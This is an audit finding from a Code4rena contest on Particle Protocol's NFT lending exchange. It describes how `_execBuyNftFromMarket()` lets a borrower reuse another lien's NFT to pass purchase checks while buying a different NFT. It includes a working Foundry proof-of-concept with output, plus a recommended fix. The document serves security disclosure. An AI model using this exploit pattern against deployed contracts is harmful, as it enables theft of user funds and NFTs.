---
# Core Classification
protocol: Particle Protocol
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 20701
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2023-05-particle
source_link: https://code4rena.com/reports/2023-05-particle
github_link: https://github.com/code-423n4/2023-05-particle-findings/issues/15

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - dexes

# Audit Details
report_date: unknown
finders_count: 2
finders:
  - minhquanym
  - bin2chen
---

## Vulnerability Title

[H-03] `_execBuyNftFromMarket()` Need to determine if NFT can't already be in the contract

### Overview


This bug report is about the `_execBuyNftFromMarket()` function in the Particle Exchange contract. This function is used for buying Non-Fungible Tokens (NFTs) from the marketplace. However, this function does not check whether the NFT is already in the contract before executing the purchase. This allows for the same NFT to be used for multiple lien payments, which can lead to the NFT being bought without actually buying it.

An example of this is Alice transferring NFT_A to supply Lien[1]. Bob then performs `sellNftToMarket(1)` and NFT_A is bought by Jack. Jack then transfers NFT_A and supplies Lien[2] (after this NFT_A exists in the contract). Bob then executes `buyNftFromMarket(1)` and spends the same amount corresponding to the purchase of other NFT such as: `tradeData = { buy NFT_K }`. This passes the verification conditions and Bob gets an additional NFT_K.

The recommended mitigation step is for `_execBuyNftFromMarket` to determine the `ownerOf()` is not equal to the contract address before buying. This bug was assessed as primary and has since been fixed.

### Original Finding Content


Use other Lien's NFTs for repayment

### Proof of Concept

`_execBuyNftFromMarket()` Whether the NFT is in the current contract after the buy, to represent the successful purchase of NFT.

```solidity
    function _execBuyNftFromMarket(
        address collection,
        uint256 tokenId,
        uint256 amount,
        uint256 useToken,
        address marketplace,
        bytes calldata tradeData
    ) internal {
...

        if (IERC721(collection).ownerOf(tokenId) != address(this) || balanceBefore - address(this).balance != amount) {
            revert Errors.InvalidNFTBuy();
        }
    }    
```

But before executing the purchase, it does not determine whether the NFT is already in the contract.

Since the current protocol does not limit an NFT to only one lien, the `_execBuyNftFromMarket()` does not actually buy NFT; the funds are used to buy other NFTs, but still meet the verification conditions.

Example.

1.  Alice transfers NFT_A to supply Lien\[1].
2.  Bob performs `sellNftToMarket(1)` and NFT_A is bought by Jack.
3.  Jack transfer NFT_A and supply Lien\[2] (after this NFT_A exists in the contract).
4.  Bob executes `buyNftFromMarket(1)` and spends the same amount corresponding to the purchase of other NFT such as: `tradeData = { buy NFT_K }`.
5.  Step 4 can be passed `IERC721(collection).ownerOf(tokenId) ! = address(this) || balanceBefore - address(this).balance ! = amount` and Bob gets an additional NFT_K.

Test code:

```solidity
    function testOneNftTwoLien() external {
        //0.lender supply lien[0]
        _approveAndSupply(lender,_tokenId);
        //1.borrower sell to market
        _rawSellToMarketplace(borrower, address(dummyMarketplace), 0, _sellAmount);
        //2.jack buy nft
        address jack = address(0x100);
        vm.startPrank(jack);
        dummyMarketplace.buyFromMarket(jack,address(dummyNFTs),_tokenId);
        vm.stopPrank();
        //3.jack  supply lien[1]
        _approveAndSupply(jack, _tokenId);        
        //4.borrower buyNftFromMarket , don't need buy dummyNFTs ,  buy other nft
        OtherDummyERC721 otherDummyERC721 = new OtherDummyERC721("otherNft","otherNft");
        otherDummyERC721.mint(address(dummyMarketplace),1);
        console.log("before borrower balance:",borrower.balance /  1 ether);
        console.log("before otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);
        bytes memory tradeData = abi.encodeWithSignature(
            "buyFromMarket(address,address,uint256)",
            borrower,
            address(otherDummyERC721),//<--------buy other nft
            1
        );
        vm.startPrank(borrower);
        particleExchange.buyNftFromMarket(
            _activeLien, 0, _tokenId, _sellAmount, 0, address(dummyMarketplace), tradeData);
        vm.stopPrank();
        //5.show borrower get 10 ether back , and get  other nft
        console.log("after borrower balance:",borrower.balance /  1 ether);
        console.log("after otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);

    }



contract OtherDummyERC721 is ERC721 {
    // solhint-disable-next-line no-empty-blocks
    constructor(string memory name, string memory symbol) ERC721(name, symbol) {}

    function mint(address to, uint256 tokenId) external {
        _safeMint(to, tokenId);
    }
}

```

```console

$ forge test --match testOneNftTwoLien  -vvv

[PASS] testOneNftTwoLien() (gas: 1466296)
Logs:
  before borrower balance: 0
  before otherDummyERC721's owner is borrower : false
  after borrower balance: 10
  after otherDummyERC721's owner is borrower : true

Test result: ok. 1 passed; 0 failed; finished in 6.44ms
```

### Recommended Mitigation Steps

`_execBuyNftFromMarket` to determine the `ownerOf()` is not equal to the contract address before buying.

```solidity
    function _execBuyNftFromMarket(
        address collection,
        uint256 tokenId,
        uint256 amount,
        uint256 useToken,
        address marketplace,
        bytes calldata tradeData
    ) internal {
        if (!registeredMarketplaces[marketplace]) {
            revert Errors.UnregisteredMarketplace();
        }
+       require(IERC721(collection).ownerOf(tokenId) != address(this),"NFT is already in contract ")
...
```

### Assessed type

Context

**[hansfriese (judge) commented](https://github.com/code-423n4/2023-05-particle-findings/issues/15#issuecomment-1578351868):**
 > PoC -> Marked as primary

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-05-particle-findings/issues/15#issuecomment-1581285129):**
 > Fixed.

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Particle Protocol |
| Report Date | N/A |
| Finders | minhquanym, bin2chen |

### Source Links

- **Source**: https://code4rena.com/reports/2023-05-particle
- **GitHub**: https://github.com/code-423n4/2023-05-particle-findings/issues/15
- **Contest**: https://code4rena.com/reports/2023-05-particle

### Keywords for Search

`vulnerability`

